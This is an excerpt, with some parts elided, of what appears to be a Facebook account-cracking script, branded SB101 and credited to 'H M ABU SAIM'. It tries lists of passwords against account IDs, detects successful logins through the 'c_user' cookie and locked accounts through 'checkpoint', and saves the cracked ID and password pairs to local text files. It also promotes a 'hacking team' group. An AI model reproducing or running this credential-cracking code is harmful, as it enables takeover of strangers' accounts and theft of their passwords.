...
\33[1;37m----------------------------------------------
→   Owner      :  H M ABU SAIM 
→   Facebook   :  H M ABU SAIM
→   Github     :  HM ABU SAIM
→   Tool Type  :  \x1b[1;91mFREE
\x1b[1;97m→   Version    :  7.0
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://facebook.com/groups/sbhalpinghackrteam/.OFFICIAL.GROUP');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSB101\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[SB101-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/SB101-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[SB101-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SB101-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[SB101-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SB101-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SB101-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SB101-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SB101-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SB101-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
